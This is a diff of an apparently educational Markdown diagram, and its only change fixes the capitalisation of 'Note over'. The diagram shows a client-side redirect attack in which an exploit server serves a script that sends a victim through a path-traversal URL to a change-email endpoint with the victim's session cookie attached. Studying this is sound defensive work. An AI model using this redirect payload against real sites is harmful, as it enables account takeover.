@@ -421,9 +421,9 @@ sequenceDiagram
 
   victim ->> exploit-server: GET https://exploit-server HTTP/1.1
   exploit-server ->> victim: HTTP/1.1 200 OK<br/>Content-Type: text/html<br/><br/><script><br/>location = "https://vulnerable-site/post/comment/confirmation?postId=1/../../my-account/change-email"<br/><script>
-  Note Over victim: client-side redirect
+  Note over victim: client-side redirect
   victim ->> vulnerable-site: GET https://vulnerable-site/post/comment/confirmation?postId=1/../../my-account/change-email HTTP/1.1
-  Note Over victim: client-side redirect
+  Note over victim: client-side redirect
   victim ->> vulnerable-site: GET https://vulnerable-site/my-account/change-email HTTP/1.1<br/>Cookie: session=123
 ```
 
